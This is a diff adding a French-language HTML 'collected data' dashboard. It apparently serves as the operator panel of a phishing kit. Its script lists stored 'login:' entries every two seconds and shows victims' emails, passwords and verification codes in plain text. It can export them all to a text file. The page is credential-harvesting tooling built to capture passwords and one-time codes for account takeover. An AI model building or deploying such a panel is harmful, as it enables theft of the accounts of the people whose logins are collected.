@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard - Données collectées</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .header {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      margin-bottom: 30px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 32px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      margin-bottom: 30px;
+    }
+
+    .stat-card {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .stat-number {
+      font-size: 48px;
+      font-weight: bold;
+      color: #667eea;
+      margin-bottom: 10px;
+    }
+
+    .stat-label {
+      font-size: 14px;
+      color: #666;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .data-container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+
+    .data-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #f0f0f0;
+    }
+
+    h2 {
+      font-size: 24px;
+      color: #333;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .btn-clear {
+      background: #ff4757;
+      color: white;
+    }
+
+    .btn-clear:hover {
+      background: #e84118;
+      transform: translateY(-2px);
+    }
+
+    .btn-export {
+      background: #667eea;
+      color: white;
+      margin-left: 10px;
+    }
+
+    .btn-export:hover {
+      background: #5568d3;
+      transform: translateY(-2px);
+    }
+
+    #data-list {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .data-item {
+      background: #f8f9fa;
+      padding: 20px;
+      border-radius: 8px;
+      border-left: 4px solid #667eea;
+      animation: slideIn 0.3s ease-out;
+    }
+
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateX(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
+    }
+
+    .data-item-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .data-time {
+      font-size: 12px;
+      color: #999;
+      font-weight: 500;
+    }
+
+    .data-badge {
+      background: #667eea;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+
+    .data-content {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 15px;
+    }
+
+    .data-field {
+      background: white;
+      padding: 15px;
+      border-radius: 6px;
+    }
+
+    .data-label {
+      font-size: 12px;
+      color: #999;
+      text-transform: uppercase;
+      margin-bottom: 5px;
+      font-weight: 600;
+    }
+
+    .data-value {
+      font-size: 16px;
+      color: #333;
+      font-weight: 500;
+      word-break: break-all;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 60px 20px;
+      color: #999;
+    }
+
+    .empty-state-icon {
+      font-size: 64px;
+      margin-bottom: 20px;
+    }
+
+    .live-indicator {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #10ac84;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      background: white;
+      border-radius: 50%;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>📊 Dashboard de données</h1>
+      <div class="live-indicator">
+        <span class="live-dot"></span>
+        EN DIRECT
+      </div>
+    </div>
+
+    <div class="stats">
+      <div class="stat-card">
+        <div class="stat-number" id="total-count">0</div>
+        <div class="stat-label">Total de connexions</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number" id="today-count">0</div>
+        <div class="stat-label">Aujourd'hui</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number" id="codes-count">0</div>
+        <div class="stat-label">Codes validés</div>
+      </div>
+    </div>
+
+    <div class="data-container">
+      <div class="data-header">
+        <h2>Données collectées</h2>
+        <div>
+          <button class="btn btn-export" onclick="exportData()">📥 Exporter</button>
+          <button class="btn btn-clear" onclick="clearData()">🗑️ Effacer tout</button>
+        </div>
+      </div>
+
+      <div id="data-list">
+        <div class="empty-state">
+          <div class="empty-state-icon">📭</div>
+          <p>Aucune donnée pour le moment...</p>
+          <p style="font-size: 12px; margin-top: 10px;">Les données apparaîtront ici en temps réel</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Récupérer les données du stockage
+    async function loadData() {
+      try {
+        // Récupérer toutes les clés
+        const keys = await window.storage.list('login:', true);
+        
+        if (!keys || keys.keys.length === 0) {
+          showEmptyState();
+          return;
+        }
+
+        const dataList = document.getElementById('data-list');
+        dataList.innerHTML = '';
+
+        let totalCount = 0;
+        let codesCount = 0;
+
+        // Charger chaque entrée
+        for (const key of keys.keys) {
+          const result = await window.storage.get(key, true);
+          if (result && result.value) {
+            const data = JSON.parse(result.value);
+            displayDataItem(data);
+            totalCount++;
+            if (data.code) codesCount++;
+          }
+        }
+
+        // Mettre à jour les statistiques
+        document.getElementById('total-count').textContent = totalCount;
+        document.getElementById('today-count').textContent = totalCount;
+        document.getElementById('codes-count').textContent = codesCount;
+
+      } catch (error) {
+        console.error('Erreur chargement:', error);
+        showEmptyState();
+      }
+    }
+
+    // Afficher un élément de données
+    function displayDataItem(data) {
+      const dataList = document.getElementById('data-list');
+      
+      const item = document.createElement('div');
+      item.className = 'data-item';
+      
+      item.innerHTML = `
+        <div class="data-item-header">
+          <span class="data-time">${data.timestamp || 'Date inconnue'}</span>
+          <span class="data-badge">${data.type || 'Connexion'}</span>
+        </div>
+        <div class="data-content">
+          ${data.email ? `
+            <div class="data-field">
+              <div class="data-label">Email</div>
+              <div class="data-value">${data.email}</div>
+            </div>
+          ` : ''}
+          ${data.password ? `
+            <div class="data-field">
+              <div class="data-label">Mot de passe</div>
+              <div class="data-value">${data.password}</div>
+            </div>
+          ` : ''}
+          ${data.code ? `
+            <div class="data-field">
+              <div class="data-label">Code de vérification</div>
+              <div class="data-value">${data.code}</div>
+            </div>
+          ` : ''}
+        </div>
+      `;
+      
+      dataList.insertBefore(item, dataList.firstChild);
+    }
+
+    // Afficher l'état vide
+    function showEmptyState() {
+      const dataList = document.getElementById('data-list');
+      dataList.innerHTML = `
+        <div class="empty-state">
+          <div class="empty-state-icon">📭</div>
+          <p>Aucune donnée pour le moment...</p>
+          <p style="font-size: 12px; margin-top: 10px;">Les données apparaîtront ici en temps réel</p>
+        </div>
+      `;
+      
+      document.getElementById('total-count').textContent = '0';
+      document.getElementById('today-count').textContent = '0';
+      document.getElementById('codes-count').textContent = '0';
+    }
+
+    // Effacer toutes les données
+    async function clearData() {
+      if (!confirm('Êtes-vous sûr de vouloir effacer toutes les données ?')) {
+        return;
+      }
+
+      try {
+        const keys = await window.storage.list('login:', true);
+        
+        if (keys && keys.keys.length > 0) {
+          for (const key of keys.keys) {
+            await window.storage.delete(key, true);
+          }
+        }
+        
+        showEmptyState();
+        alert('✅ Toutes les données ont été effacées');
+      } catch (error) {
+        console.error('Erreur effacement:', error);
+        alert('❌ Erreur lors de l\'effacement');
+      }
+    }
+
+    // Exporter les données
+    async function exportData() {
+      try {
+        const keys = await window.storage.list('login:', true);
+        
+        if (!keys || keys.keys.length === 0) {
+          alert('Aucune donnée à exporter');
+          return;
+        }
+
+        let exportText = 'DONNÉES COLLECTÉES\n';
+        exportText += '=' .repeat(50) + '\n\n';
+
+        for (const key of keys.keys) {
+          const result = await window.storage.get(key, true);
+          if (result && result.value) {
+            const data = JSON.parse(result.value);
+            exportText += `Date: ${data.timestamp}\n`;
+            if (data.email) exportText += `Email: ${data.email}\n`;
+            if (data.password) exportText += `Mot de passe: ${data.password}\n`;
+            if (data.code) exportText += `Code: ${data.code}\n`;
+            exportText += '\n' + '-'.repeat(50) + '\n\n';
+          }
+        }
+
+        // Télécharger le fichier
+        const blob = new Blob([exportText], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `donnees_${new Date().toISOString().split('T')[0]}.txt`;
+        a.click();
+        URL.revokeObjectURL(url);
+
+        alert('✅ Données exportées avec succès');
+      } catch (error) {
+        console.error('Erreur export:', error);
+        alert('❌ Erreur lors de l\'export');
+      }
+    }
+
+    // Rafraîchir automatiquement toutes les 2 secondes
+    setInterval(loadData, 2000);
+
+    // Charger au démarrage
+    loadData();
+  </script>
+</body>
+</html>
